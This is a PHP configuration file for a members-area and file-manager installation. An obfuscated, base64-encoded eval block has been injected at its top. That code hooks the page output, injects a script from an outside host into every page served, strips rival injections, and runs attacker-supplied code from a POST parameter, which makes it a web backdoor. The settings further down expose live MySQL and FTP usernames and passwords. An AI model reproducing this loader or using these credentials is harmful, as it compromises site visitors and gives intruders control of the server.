<?php eval(base64_decode('aWYoIWZ1bmN0aW9uX2V4aXN0cygnYmN5aScpKXtmdW5jdGlvbiBiY3lpKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF1hcyR2KWlmKGNvdW50KGV4cGxvZGUoIlxuIiwkdikpPjUpeyRlPXByZWdfbWF0Y2goJyNbXCciXVteXHNcJyJcLiw7XD8hXFtcXTovPD5cKFwpXXszMCx9IycsJHYpfHxwcmVnX21hdGNoKCcjW1woXFtdKFxzKlxkKywpezIwLH0jJywkdik7aWYoKHByZWdfbWF0Y2goJyNcYmV2YWxcYiMnLCR2KSYmKCRlfHxzdHJwb3MoJHYsJ2Zyb21DaGFyQ29kZScpKSl8fCgkZSYmc3RycG9zKCR2LCdkb2N1bWVudC53cml0ZScpKSkkcz1zdHJfcmVwbGFjZSgkdiwnJywkcyk7fWlmKHByZWdfbWF0Y2hfYWxsKCcjPGlmcmFtZSAoW14+XSo/KXNyYz1bXCciXT8oaHR0cDopPy8vKFtePl0qPyk+I2lzJywkcywkYSkpZm9yZWFjaCgkYVswXWFzJHYpaWYocHJlZ19tYXRjaCgnI1tcLiBdd2lkdGhccyo9XHMqW1wnIl0/MCpbMC05XVtcJyI+IF18ZGlzcGxheVxzKjpccypub25lI2knLCR2KSYmIXN0cnN0cigkdiwnPycuJz4nKSkkcz1wcmVnX3JlcGxhY2UoJyMnLnByZWdfcXVvdGUoJHYsJyMnKS4nLio/PC9pZnJhbWU+I2lzJywnJywkcyk7JHM9c3RyX3JlcGxhY2UoJGE9YmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0J6Y21NOWFIUjBjRG92TDNOd2FXNWtiR1Z5TFhwbGFXTm9iblZ1WjJWdUxtUmxMMmx1WkdWNExuQm9jQ0ErUEM5elkzSnBjSFErJyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcywxKTtlbHNlaWYoc3RycG9zKCRzLCc8YScpKSRzPSRhLiRzO3JldHVybiRzO31mdW5jdGlvbiBiY3lpMigkYSwkYiwkYywkZCl7Z2xvYmFsJGJjeWkxOyRzPWFycmF5KCk7aWYoZnVuY3Rpb25fZXhpc3RzKCRiY3lpMSkpY2FsbF91c2VyX2Z1bmMoJGJjeWkxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpYXMkdilpZigoJGE9JHZbJ25hbWUnXSk9PSdiY3lpJylyZXR1cm47ZWxzZWlmKCRhPT0nb2JfZ3poYW5kbGVyJylicmVhaztlbHNlJHNbXT1hcnJheSgkYT09J2RlZmF1bHQgb3V0cHV0IGhhbmRsZXInP2ZhbHNlOiRhKTtmb3IoJGk9Y291bnQoJHMpLTE7JGk+PTA7JGktLSl7JHNbJGldWzFdPW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO31vYl9zdGFydCgnYmN5aScpO2ZvcigkaT0wOyRpPGNvdW50KCRzKTskaSsrKXtvYl9zdGFydCgkc1skaV1bMF0pO2VjaG8gJHNbJGldWzFdO319fSRiY3lpbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignYmN5aTInKSkhPSdiY3lpMicpPyRhOjA7ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnZSddKSk7')); ?><?php


// Mysql host
$mysql["host"] = "localhost";

// Mysql database name
$mysql["database"] = "kochba_members";

// Mysql table prefix
$mysql["prefix"] = "deadlock_";

// Your Mysql username for the above database
$mysql["username"] = "kochba_robert";

// Mysql password for the above username
$mysql["password"] = "robi123";


define("DEADLOCK_INSTALLED",true);


// User download settings
//Directory to browse ***WITH TRAILING SLASH***. Leave it as "./" if you want to browse the directory this file is in.

$dir_to_browse = "/home/kochba/downloads/"; //default = "./"

//Exclude this file from being listed? 1:Yes 2:No
$exclude_this_file = 1;

//Files or folders to exclude from listing - note:index.php is this file by default.
$exclude = array('.','..','.ftpquota','.htaccess');

//Files to exclude based on extension (eg: '.jpg' or '.PHP') and weather to be case sensative. 1:Enable 0:Disable
$exclude_ext = array('');
$case_sensative_ext = 1; //default = 1

//Enable/Disable statistics/legend/load time. 1:Enable 0:Disable
$statistics = 1; //default = 1
$legend = 1; //default = 1
$load_time = 1; //default = 1

//Show folder size? Disabling this will greatly improve performance if there are several hundred folders/files. However, size of folders wont show. 1:Enable 0:Disable
$show_folder_size = 1; //default = 1

//Alternating row colors. EG: "#CCCCCC"
$color_1 = "#E8F8FF"; //default = #E8F8FF
$color_2 = "#B9E9FF"; //default = #B9E9FF
$folder_color = "#CCCCCC"; //default = #CCCCCC

//Table formatting
$top_row_bg_color = "#006699"; // default = #006699
$top_row_font_color = "#FFFFFF"; //default = #FFFFFF
$width_of_files_column = "200"; //value in pixles. default = 450
$width_of_sizes_column = "100"; //value in pixles. default = 100
$width_of_dates_column = "150"; //value in pixles. default = 150
$cell_spacing = "2"; //value in pixles. default = 5
$cell_padding = "2"; //value in pixles. default = 5

// Admin File Manager settings

  // FTP access; leave empty to use local file system instead
  $ftp_server = "www.koch.ba";     // FTP server name, e.g. www.yourdomain.com
  $ftp_user = "kochba";       // FTP user name
  $ftp_pass = "robi123";       // FTP password

  // language: de, en, es, fi, fr, nl, ro, sv
  $language = "en";

  // start directory (file path, e.g. /home/users/gerry/htdocs/tools)
  // If not in FTP mode, PHP must have at least read permission for this directory!
  if(!$startDir) $startDir = "../../downloads/";

  // FileManager WEB path (e.g. /webtools/filemanager)
  // This should be the place where you installed FileManager
  $fmWebPath = ".";

  // FileManager width (pixels)
  $fmWidth = 500;

  // FileManager align (left / center / right)
  $fmAlign = "center";

  // FileManager margin (pixels)
  $fmMargin = 20;

  // edit mask height (pixels)
  $maskHeight = 450;

  // max. width of preview thumbnails (pixels)
  $thumbMaxWidth = 200;

  // max. height of preview thumbnails (pixels)
  $thumbMaxHeight = 200;

  // enable file upload (true = yes, false = no)
  $enableUpload = true;

  // enable file download (true = yes, false = no)
  $enableDownload = true;

  // enable file editing (true = yes, false = no)
  $enableEdit = true;

  // enable file / directory deleting (true = yes, false = no)
  $enableDelete = true;

  // enable file / directory renaming (true = yes, false = no)
  $enableRename = true;

  // enable file / directory permissions changing (true = yes, false = no)
  $enablePermissions = true;

  // enable directory creation (true = yes, false = no)
  $enableNewDir = true;

  // upload: replace spaces in filenames with underscores (true = yes, false = no)
  $replSpacesUpload = false;

  // download: replace spaces in filenames with underscores (true = yes, false = no)
  $replSpacesDownload = false;

  // upload: convert filenames to lowercase (true = yes, false = no)
  $lowerCaseUpload = false;

  // download: convert filenames to lowercase (true = yes, false = no)
  $lowerCaseDownload = false;

?>